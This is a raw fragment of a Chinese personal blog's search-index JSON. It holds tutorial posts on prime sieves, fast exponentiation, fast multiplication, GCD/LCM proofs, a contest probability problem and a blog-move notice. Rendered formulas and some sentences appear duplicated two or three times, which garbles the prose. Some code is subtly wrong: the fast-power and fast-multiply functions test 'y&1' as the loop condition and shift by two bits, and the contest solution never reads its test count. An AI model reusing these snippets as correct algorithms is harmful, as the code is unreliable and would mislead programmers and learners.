j+=i) isprime[j]=false;&#125;int main()&#123; int n; cin&gt;&gt;n; find(n); for (int i = 1; i &lt;= n; i++) &#123; if(isprime[i]) cout&lt;&lt;i&lt;&lt;endl; &#125;&#125; 再优化 如果使用之前的算法，那么对于数字6来说，它既会被数字2搜到，也会被数字3搜到，这个算法的复杂度是O(nlog⁡(log⁡n))O(n\\log (\\log n))O(nlog(logn)),于是我们考虑能不能避免重复搜索，首先，由于之前谈到数的因子是成对存在的，所以在筛除的过程中，我们只需要使用n\\sqrt nn​之前的数去筛除即可，再者，对于一个数i，在考虑另一个数j与他相乘构成合数时，如果$ j &lt; i ，那么我在之前使用j做筛除的时候已经把，那么我在之前使用j做筛除的时候已经把，那么我在之前使用j做筛除的时候已经把j\\times i筛除掉了，所以我们每次只需要从筛除掉了，所以我们每次只需要从筛除掉了，所以我们每次只需要从i\\times i$开始筛就行了，代码如下： 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;const int maxn=1e5+10;bool isprime[maxn];void find(int n)&#123; isprime[1]=false; for (int i = 2; i &lt;= n; i++) isprime[i]=true; for (int i = 2; i*i &lt;= n; i++) if (isprime[i]) for (size_t j = i*i; j &lt;= n; j+=i) isprime[j]=false;&#125;int main()&#123; int n; cin&gt;&gt;n; find(n); for (int i = 1; i &lt;= n; i++) &#123; if(isprime[i]) cout&lt;&lt;i&lt;&lt;endl; &#125;&#125; 终极优化 当时间已经无法直接得到优化，那我们通常会去考虑使用适量的空间来间接的优化时间，算法中有很多这样用空间换时间的例子，线性筛法，也就是欧拉筛法，就是其中之一。以埃筛为基础思想，埃筛中是使用一个素数为基础，去乘以其他数，来筛除合数，那我们考虑能否以任意的一个数为基础，去乘以所有已经确认的素数，来筛除合数？ 对于我们所选择的数，它包含两种情况： Ⅰ.这个数是素数 Ⅱ.这个数是合数 对于第一种情况，直接将这个素数去乘以所有的已经选好的素数就行了，由于唯一分解定理的存在，一个合数被分解成一系列素数的乘积的结果是唯一的，所以是不可能出现重复的。 对于第二种情况，又由于唯一分解定理(怎么又是你),一个合数存在最小质因子，假设我们选用的数字是i，而i的最小质因子是p[j]，即i=p[j]×xi=p[j]\\times xi=p[j]×x，那么，使用所有小于p[j]的值去和i相乘然后筛除得到的数是不会发生重复的，而对于大于p[j]的素数，假设这个素数为p[j+1]，那么i×p[j+1]i\\times p[j+1]i×p[j+1]又可以展开为p[j]×x×p[j+1]p[j]\\times x\\times p[j+1]p[j]×x×p[j+1]，而x×p[j+1]x\\times p[j+1]x×p[j+1]在之后的枚举中我们又会枚举到，所以在碰到i的最小质因子之后我们就不需要继续了。 下面来欣赏代码: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;const int maxn=1e5+10;bool isprime[maxn];int p[maxn];void find(int n)&#123; memset(isprime,true,sizeof(isprime)); isprime[1]=false; int pos=0; for (int i = 2; i &lt;= n; i++) &#123; if(isprime[i])p[pos++]=i; for (int j = 0; j &lt; pos&amp;&amp;i*p[j]&lt;=n; j++) &#123; isprime[i*p[j]]=false; if(!(i%p[j]))break; &#125; &#125;&#125;int main()&#123; int n; cin&gt;&gt;n; find(n); for (int i = 1; i &lt;= n; i++) &#123; if(isprime[i]) cout&lt;&lt;i&lt;&lt;endl; &#125;&#125; 由于该算法中，[1,N][1,N][1,N]中的每个数都只搜到了一遍，所以该算法的时间复杂度为O(n)O(n)O(n)。 使用筛法可以实现的一些算法 学完如此优美的欧拉筛后，我已经迫不及待的想要实践了，下面列举一些应用场景 找出[1,N][1,N][1,N]中每个数的质因子 1234567891011121314#include&lt;cstdio&gt;#include&lt;vector&gt;using namespace std;const int N = 1e6 + 5;vector&lt;int&gt; v[N];void init()&#123; for(int i = 2; i &lt; N; i ++) if(v[i].size() == 0) for(int j = i; j &lt; N; j += i) v[j].push_back(i); &#125;int main()&#123; init();&#125; 找出[1,N][1,N][1,N]中每个数的因子 12345678910111213#include&lt;cstdio&gt;#include&lt;vector&gt;using namespace std;const int N = 1e6 + 5;vector&lt;int&gt; v[N];void init()&#123; for(int i = 2; i &lt; N; i ++) for(int j = i; j &lt; N; j += i) v[j].push_back(i); &#125;int main()&#123; init();&#125; 实现唯一分解定理 12345678910111213141516171819202122#include&lt;cstdio&gt;#include&lt;vector&gt;using namespace std;const int N = 1e6 + 5;vector&lt;int &gt; v[N];void init()&#123; int temp; for(int i = 2; i &lt; N; i ++)&#123; if(v[i].size() == 0)&#123; for(int j = i; j &lt; N; j += i)&#123; temp = j; while(temp % i == 0)&#123; v[j].push_back(i); temp /= i; &#125; &#125; &#125; &#125;&#125;int main()&#123; init();&#125; 参考资料 Ⅰ.关于素数 Ⅱ.欧拉筛法","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论初步","slug":"ACM/数论初步","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%88%9D%E6%AD%A5/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论初步:快速幂","slug":"数论初步-快速幂","date":"2021-01-17T12:13:37.000Z","updated":"2024-07-30T11:26:33.934Z","comments":true,"path":"2021/01/17/数论初步-快速幂/","permalink":"http://enderxiao.github.io/2021/01/17/%E6%95%B0%E8%AE%BA%E5%88%9D%E6%AD%A5-%E5%BF%AB%E9%80%9F%E5%B9%82/","excerpt":"","text":"关于幂 所谓幂，就是当计算m个n相乘时，即nmn^mnm时，n的指数，所谓幂运算就是指针对幂的运算。 求次方 现在给定n和m，请求出nmn^mnm，那么，首先想到的当然时cmath中提供的pow()函数，既简单又轻便，但是我们知道，这个函数的参数和返回值都是double类型的，精度可能会有误差，或者当需要计算的数很大(通常题目会要求取模一个比较小的数)时（具体之后谈），采用这个直接的方法显然不太过得去，于是我们根据定义自己模拟一下： 查看代码 12345678typedef long long ll;ll myPow(ll x, ll y)&#123; ll ans = 1; for(int i = 0; i &lt; y; i++)&#123; ans *= x; &#125; return ans&#125; 优化 如果题目要求m∈[1,109]m\\in [1,10^9]m∈[1,109]。。。。果断超时，于是想想如何让求幂的运算变快。 对于10810^{8}108而言,是否可以看成是102310^{2^{3}}1023，于是我们可以先计算10210^2102，再计算1003100^31003这样原来的8次循环减小到了三次，同理10102410^{1024}101024,此方法将会使循环减小到10次。下面看代码： 查看代码 1234567891011//还有递归的写法，可以自己实践一下typedef long long ll;ll myPow(ll x, ll y)&#123; ll ans = 1; while(y != 0)&#123; if(y%2) ans *= x; x *= x; y /= 2; &#125; return ans;&#125; 如果所求数很大，一般会让取模，由模运算的规则： (a×b)mod c=(amod c×bmod c)mod c(a\\times b)\\mod c=(a\\mod c \\times b\\mod c)\\mod c(a×b)modc=(amodc×bmodc)modc 得到，可以把取模运算分散到计算的每一步中，其次还可以使用位运算来优化，（由计算机组成原理的知识知道直接的位运算要比数学运算来的快），下面给出代码 查看代码 1234567891011121314const int mod=10;typedef long long ll;ll quickPow(ll x,ll y)&#123; ll ans=1; while(y&amp;1) &#123; if(y%2) ans=(ans*x)%mod; x=(x*x)%mod; y&gt;&gt;=2; &#125; return ans;&#125; 快速乘 同样的方法也能将乘法进行这样的变化，俗称快速乘法，不过速度上好像没快多少，但是可以把乘法分解，可以自己动手试试 查看代码 1234567891011121314const int mod=10;typedef long long ll;ll qt(ll x,ll y)&#123; ll ans=0; while(y&amp;1) &#123; if(y%2) ans=(ans+x)%mod; x=(x+x)%mod; y&gt;&gt;=2; &#125; return ans;&#125; 参考链接 Ⅰ.境外之主","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论初步","slug":"ACM/数论初步","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%88%9D%E6%AD%A5/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论初步:GCD和LCM","slug":"数论初步-GCD和LCM","date":"2021-01-17T11:56:31.000Z","updated":"2024-07-30T11:26:33.934Z","comments":true,"path":"2021/01/17/数论初步-GCD和LCM/","permalink":"http://enderxiao.github.io/2021/01/17/%E6%95%B0%E8%AE%BA%E5%88%9D%E6%AD%A5-GCD%E5%92%8CLCM/","excerpt":"","text":"GCD GCD，也就是最大公约数，即两个数拥有的相同的因数集中最大的一个。 求法 如果求任意两个数的GCD呢，相信小学的时候都学过辗转相除法，也就是欧几里得算法，当然还有以前学过的更相减损术，这里只讨论欧几里得算法（据说更相减损术是欧几里得算法的特殊情况）。 欧几里得算法 描述 欧几里得算法的内容是： 两个数的最大公约数是指能同时整除它们的最大正整数。 设两数为a,b(a≥b)a,b(a\\geq b)a,b(a≥b)，求a和b最大公约数gcd(a,b)的步骤如下： Ⅰ.用a除以b，a≥ba\\geq ba≥b，得a÷b=q…r1(0≤r1)a \\div b=q…r_1(0\\leq r_1)a÷b=q…r1​(0≤r1​)。 Ⅱ.若r1=0r_1=0r1​=0，则gcd(a,b)=bgcd(a,b)=bgcd(a,b)=b； Ⅲ.若r1≠0r_1\\neq 0r1​=0，则再用b÷r1=q…r1(0≤r1)b\\div r_1=q…r1(0\\leq r_1)b÷r1​=q…r1(0≤r1​)。 如此往复，直到余数为0，那么gcd(a,b)为除数。 证明 证明欧几里得算法，也就是证明： Ⅰ.gcd(a,b)==gcd(b,amod b)gcd(a,b)==gcd(b,a\\mod b)gcd(a,b)==gcd(b,amodb). Ⅱ.所求为最优. Ⅰ 首先设c为a,b的公因数，则设a=m×c,b=n×ca=m\\times c,b=n\\times ca=m×c,b=n×c。 设a=k×b+ra=k\\times b+ra=k×b+r，则得到r=a−k×b=m×c−k×n×c=(m−k×n)×cr=a-k\\times b=m\\times c-k\\times n\\times c=(m-k\\times n)\\times cr=a−k×b=m×c−k×n×c=(m−k×n)×c。 则c也为b和r的公因数。 再者，设b和r的公因数为v，则设 b=i×vb=i\\times vb=i×v r=j×vr=j\\times vr=j×v 于是有a=k×b+r=k×i×v+j×v=(k×i+j)×va=k\\times b+r=k\\times i\\times v+j\\times v=(k\\times i+j)\\times va=k×b+r=k×i×v+j×v=(k×i+j)×v。 则a和b的公约数也为v. 综上我们可以使用这个递推。 Ⅱ 下面我们来推一下: amod b=ra\\mod b=ramodb=r bmod r=r1b\\mod r=r_1bmodr=r1​ rmod r1=r2r\\mod r_1=r_2rmodr1​=r2​ …… rn−3mod rn−2=rn−1r_{n-3}\\mod r_{n-2}=r_{n-1}rn−3​modrn−2​=rn−1​ rn−2mod rn−1=rnr_{n-2}\\mod r_{n-1}=r_nrn−2​modrn−1​=rn​ 由于a≥b≥0a\\geq b\\geq 0a≥b≥0那么r1….rnr_1….r_nr1​….rn​是递减的，最终将变为0. 则当rn−1≠0,rn==0r_{n-1}\\neq 0,r_n==0rn−1​=0,rn​==0时，可以得到rn−1∣rn−2r_{n-1}|r_{n-2}rn−1​∣rn−2​（’|’为整除符号，a|b代表b能被a整除），则rn−2和rn−1r_{n-2}和r_{n-1}rn−2​和rn−1​的公约数只有rn−1和rn−1的约数r_{n-1}和r_{n-1}的约数rn−1​和rn−1​的约数，其中最大的就是rn−1r_{n-1}rn−1​。 代码实现 接下来给出代码实现 123int gcd(int x, int y)&#123; return y?gcd(y, x%y):x;&#125; LCM 聊完GCD，再来聊聊LCM，也就是最小公倍数,即两个数公共的倍数集合中最小的元素。 求法 对于两个数a,b,有公式: a×b=lcm(a,b)×gcd(a,b)a\\times b=lcm(a,b)\\times gcd(a,b)a×b=lcm(a,b)×gcd(a,b)。 证明 设x=gcd(a,b)x=gcd(a,b)x=gcd(a,b)； 则n=a/x,m=b/xn=a/x,m=b/xn=a/x,m=b/x。显然a和m是互素的，所以lcm(n,m)=n×mlcm(n,m)=n\\times mlcm(n,m)=n×m,又因为lcm(a,b)=lcm(n×x,m×x)=x×n×mlcm(a,b)=lcm(n\\times x,m\\times x)=x\\times n\\times mlcm(a,b)=lcm(n×x,m×x)=x×n×m。 所以lcm(a,b)=gcd(a,b)×a/gcd(a,b)×b/gcd(a,b)lcm(a,b)=gcd(a,b)\\times a/gcd(a,b)\\times b/gcd(a,b)lcm(a,b)=gcd(a,b)×a/gcd(a,b)×b/gcd(a,b)，即lcm(a,b)×gcd(a,b)=a×blcm(a,b)\\times gcd(a,b)=a\\times blcm(a,b)×gcd(a,b)=a×b 代码实现 123int lcm(int a, int b)&#123; return a/gcd(a, b)*b;//先做除法避免溢出&#125; 参考链接 Ⅰ.欧几里得算法证明 Ⅱ.境外之主","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论初步","slug":"ACM/数论初步","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%88%9D%E6%AD%A5/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"2017南华大学省赛选拔赛,A大神的游戏","slug":"2017南华大学省赛选拔赛，A大神的游戏","date":"2021-01-17T11:32:37.000Z","updated":"2024-07-30T11:26:33.904Z","comments":true,"path":"2021/01/17/2017南华大学省赛选拔赛，A大神的游戏/","permalink":"http://enderxiao.github.io/2021/01/17/2017%E5%8D%97%E5%8D%8E%E5%A4%A7%E5%AD%A6%E7%9C%81%E8%B5%9B%E9%80%89%E6%8B%94%E8%B5%9B%EF%BC%8CA%E5%A4%A7%E7%A5%9E%E7%9A%84%E6%B8%B8%E6%88%8F/","excerpt":"","text":"题目链接 2017南华大学省赛选拔赛——A 大神的游戏(内网访问) 题意 大神给定一个正整数n，要求我们随机的在纸上写出整数集合{1,2,3,…,3×n+1}\\{1,2,3,…,3\\times n+1\\}{1,2,3,…,3×n+1}(n为正整数)的一个排列，要求在谢的过程中从第一个数到正在写的数的和不是3的倍数，如果能写出符合要求的一个排列则游戏获胜，请问赢得游戏的概率。 输入 开始输入一个正整数t表示测试样例的个数 接下来t行每行一个正整数n，表示一个样例 1≤n≤151\\leq n\\leq 151≤n≤15 输出 对于每个样例，输出获胜的概率(结果保留9位有效数字) Sample Input 123451211 Sample Output 12310.250000000 分析 对于分母而言，由于是[1,3×n+1][ 1,3\\times n+1 ][1,3×n+1]的全排列，则需要计算(3×n+1)!(3\\times n+1)!(3×n+1)!而n=15n=15n=15那么分母要么用大数，要么推公式，接下来我们推导公式 对于分子而言，分子等于符合要求的排列的数量，接下来我们分析这种排列的数量。 对于[1,3×n+1][ 1,3\\times n+1 ][1,3×n+1]，由于我们考虑的是它们的和是否是3的倍数，那么我们对这些数都取模3，则数列变为： 1,2,3,1,2,3,…,11,2,3,1,2,3,…,11,2,3,1,2,3,…,1 接下来我们考虑1，2，3的个数分别为多少： 1：每三个数中有一个，再加最后一个，则为n+1n+1n+1个 2：每三个数中有一个，即nnn个 3：每三个数中有一个，即nnn个 那么这些数3无法放在第一位，而3放在某个数之后时，在模3的情况下，之前的数的和不会改变，那么我们可以先把3全部拿出来不暂时不讨论 那么这些数总共还剩2×n+12\\times n+12×n+1个，再讨论首位为2的情况，由于首位为2，那么第二位不能是1，则第二位也为2，即： 2,22,22,2 那么他们的和在模3的情况下为1，那么第三位不能是2，则第三位为1，即 2,2,12,2,12,2,1 他们的和为2(mod 3)，那么第四位不能是1，则第四位为2，即 2,2,1,22,2,1,22,2,1,2 他们的和为1，则出现循环，即之后的数的排列为1，2交替出现，但是2的个数比1的个数少一个，那么之后必定会出现两个连续的1，即2,1,12,1,12,1,1,当结尾为2时，和为1(mod 3)，在加两个连续的1，那么结果将会是3的倍数，所以首位不能为2。 于是首位只能是1，同理，首位为1的情况下，排列为： 1,1,2,1,2,1,2….1,1,2,1,2,1,2….1,1,2,1,2,1,2….，即第一位第二位为两个1，之后1，2交替。 由于1的数量刚好比2多一个，则除首位1以外，1，2刚好两两匹配，符合题意。 那么考虑了这个排列的个数，第一位为n+1n+1n+1个1中选一个Cn+11C_{n+1}^1Cn+11​，第二位为nnn个1中选一个Cn1C_n^1Cn1​，第三位为nnn个2中选一个Cn1C_n^1Cn1​以此类推，则总共有(n+1)!×n!(n+1)!\\times n!(n+1)!×n!种。 由于将3放在某个排列的末尾，在模3的情况下，不会改变该排列的和，则将3插入到这个排列的任意排列之后即可，由于3无法插入到首位，那么插入第一个3时有2×n+12\\times n+12×n+1种插法，插入第二个3时，由于之前插入了一个3，则排列多了一个数，则有2×n+22\\times n+22×n+2种，以此类推,插入最后一个3时有3×n3\\times n3×n种方法。 所以综上所述，总共有(n+1)!×n!×(2×n+1)×(2×n+2)×…×(3×n)(n+1)!\\times n!\\times (2\\times n+1)\\times (2\\times n+2)\\times …\\times (3\\times n)(n+1)!×n!×(2×n+1)×(2×n+2)×…×(3×n)种。 于是概率为(n+1)!×n!×(2×n+1)×(2×n+2)×…×(3×n)(3×n+1)!\\frac {(n+1)!\\times n!\\times (2\\times n+1)\\times (2\\times n+2)\\times …\\times (3\\times n)}{(3\\times n+1)!}(3×n+1)!(n+1)!×n!×(2×n+1)×(2×n+2)×…×(3×n)​,上下同时约去(n+1)!(n+1)!(n+1)!，为： n!×(2×n+1)×(2×n+2)×…×(3×n)(n+2)×…×(3×n+1)\\frac {n!\\times (2\\times n+1)\\times (2\\times n+2)\\times …\\times (3\\times n)}{(n+2)\\times …\\times (3\\times n+1)}(n+2)×…×(3×n+1)n!×(2×n+1)×(2×n+2)×…×(3×n)​ 在上下同时除以(2×n+1)×(2×n+2)×…×(3×n)(2\\times n+1)\\times (2\\times n+2)\\times …\\times (3\\times n)(2×n+1)×(2×n+2)×…×(3×n),为： n!(n+2)×(n+3)×…×(2×n)×(3×n+1)\\frac {n!}{(n+2)\\times (n+3)\\times …\\times (2\\times n)\\times (3\\times n+1)}(n+2)×(n+3)×…×(2×n)×(3×n+1)n!​。 在上下同时乘以(n+1)(n+1)(n+1)得： n!×(n+1)(n+1)×(n+2)×…×(2×n)×(3×n+1)\\frac {n!\\times (n+1)}{(n+1)\\times (n+2)\\times … \\times (2\\times n)\\times (3\\times n+1)}(n+1)×(n+2)×…×(2×n)×(3×n+1)n!×(n+1)​,即n+13×n+1×n!(n+1)×(n+2)×…×(2×n)\\frac {n+1}{3\\times n+1}\\times \\frac {n!}{(n+1)\\times (n+2)\\times …\\times (2\\times n)}3×n+1n+1​×(n+1)×(n+2)×…×(2×n)n!​,于是后一项就可以以O(n)的方法算出，且不会超过范围。 AC代码 查看代码 1234567891011121314151617#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;algorithm&gt;using namespace std;int main()&#123; int t; while(t--)&#123; int n; cin&gt;&gt;n; double ans = (n + 1.0) / (3 * n + 1); for(int i = 1; i &lt;= n; i++)&#123; ans *= (i * 1.0) / (n + i); &#125; printf(&quot;%.9lf\\n&quot;, ans); &#125; return 0;&#125;","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"赛后补题","slug":"ACM/赛后补题","permalink":"http://enderxiao.github.io/categories/ACM/%E8%B5%9B%E5%90%8E%E8%A1%A5%E9%A2%98/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"概率","slug":"概率","permalink":"http://enderxiao.github.io/tags/%E6%A6%82%E7%8E%87/"},{"name":"组合数学","slug":"组合数学","permalink":"http://enderxiao.github.io/tags/%E7%BB%84%E5%90%88%E6%95%B0%E5%AD%A6/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"乔迁","slug":"乔迁","date":"2021-01-16T09:50:00.000Z","updated":"2024-07-30T11:26:33.922Z","comments":true,"path":"2021/01/16/乔迁/","permalink":"http://enderxiao.github.io/2021/01/16/%E4%B9%94%E8%BF%81/","excerpt":"","text":"恭喜搬家！ 这是我第二次使用Hexo搭建静态个人博客了，之前的博客因为电脑送修忘了保存，加上我对hexo、git、和前端等技术的了解不够深刻，于是决定重新搭建一个blog，并能坚持下去持续更新🤦‍♂️ 测试 公式渲染测试 e=m×c2e = m\\times c^2e=m×c2 代码渲染测试 123456#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;int main()&#123; cout&lt;&lt;&quot;Hello Hexo&quot;&lt;&lt;endl;&#125;","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"blog","slug":"blog","permalink":"http://enderxiao.github.io/tags/blog/"}],"author":{"name":"Ender","avatar":"https://i.postimg.cc/wTR2SYS2/end-bindrune.png","url":"/"}}],"categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Mock","slug":"前端/Mock","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/Mock/"},{"name":"工作","slug":"工作","permalink":"http://enderxiao.github.io/categories/%E5%B7%A5%E4%BD%9C/"},{"name":"React","slug":"工作/React","permalink":"http://enderxiao.github.io/categories/%E5%B7%A5%E4%BD%9C/React/"},{"name":"设计模式","slug":"前端/设计模式","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"容器","slug":"容器","permalink":"http://enderxiao.github.io/categories/%E5%AE%B9%E5%99%A8/"},{"name":"docker","slug":"容器/docker","permalink":"http://enderxiao.github.io/categories/%E5%AE%B9%E5%99%A8/docker/"},{"name":"网络安全","slug":"前端/网络安全","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"后端","slug":"后端","permalink":"http://enderxiao.github.io/categories/%E5%90%8E%E7%AB%AF/"},{"name":"NodeJS","slug":"后端/NodeJS","permalink":"http://enderxiao.github.io/categories/%E5%90%8E%E7%AB%AF/NodeJS/"},{"name":"mySQL","slug":"后端/mySQL","permalink":"http://enderxiao.github.io/categories/%E5%90%8E%E7%AB%AF/mySQL/"},{"name":"八股","slug":"前端/八股","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/%E5%85%AB%E8%82%A1/"},{"name":"Vite","slug":"前端/Vite","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/Vite/"},{"name":"HTML","slug":"前端/HTML","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/HTML/"},{"name":"JS","slug":"前端/JS","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"},{"name":"NodeJS","slug":"前端/JS/NodeJS","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/JS/NodeJS/"},{"name":"CSS","slug":"前端/CSS","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/CSS/"},{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"论文","slug":"研究生/论文","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E8%AE%BA%E6%96%87/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/categories/Transformer/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"},{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"影音设备","slug":"Life/影音设备","permalink":"http://enderxiao.github.io/categories/Life/%E5%BD%B1%E9%9F%B3%E8%AE%BE%E5%A4%87/"},{"name":"开发工具","slug":"开发工具","permalink":"http://enderxiao.github.io/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"},{"name":"Unity","slug":"开发工具/Unity","permalink":"http://enderxiao.github.io/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Unity/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"},{"name":"Vue","slug":"前端/Vue","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/Vue/"},{"name":"CvT","slug":"研究生/科研/OCR/CvT","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/CvT/"},{"name":"电影","slug":"Life/电影","permalink":"http://enderxiao.github.io/categories/Life/%E7%94%B5%E5%BD%B1/"},{"name":"CoMER","slug":"研究生/科研/OCR/CoMER","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/CoMER/"},{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器学习入门","slug":"硕士研究生/机器学习入门","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"},{"name":"RNN","slug":"硕士研究生/机器学习入门/RNN","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/"},{"name":"Transformer","slug":"硕士研究生/机器学习入门/RNN/Transformer","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/"},{"name":"注意力机制","slug":"硕士研究生/机器学习入门/RNN/Transformer/注意力机制","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"自注意力机制","slug":"硕士研究生/机器学习入门/RNN/Transformer/注意力机制/自注意力机制","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E8%87%AA%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"端到端","slug":"硕士研究生/机器学习入门/RNN/Transformer/注意力机制/自注意力机制/端到端","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E8%87%AA%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E7%AB%AF%E5%88%B0%E7%AB%AF/"},{"name":"编码解码架构","slug":"硕士研究生/机器学习入门/RNN/Transformer/注意力机制/自注意力机制/端到端/编码解码架构","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/RNN/Transformer/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E8%87%AA%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/%E7%AB%AF%E5%88%B0%E7%AB%AF/%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E6%9E%B6%E6%9E%84/"},{"name":"CNN","slug":"硕士研究生/机器学习入门/CNN","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F